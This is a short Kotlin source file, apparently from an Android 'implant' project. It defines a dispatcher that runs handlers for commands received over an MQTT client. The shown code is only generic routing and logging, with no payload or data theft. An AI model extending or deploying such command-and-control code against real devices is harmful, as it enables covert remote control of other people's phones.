package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import org.eclipse.paho.android.service.MqttAndroidClient

class CommandDispatcher(context: Context, val client: MqttAndroidClient) {

    companion object {
        val TAG: String = CommandDispatcher::class.java.name
    }

    val context: Context = context.applicationContext

    fun dispatch(command: Command) {
        val handler = CommandRegistry.handlerFor(context, client, command)
        Log.d(TAG, "Handler found: $handler")
        try {
            handler.action()
        } catch (e: Exception) {
            Log.d(TAG, "Error executing ${command.command}", e)
        }
    }
}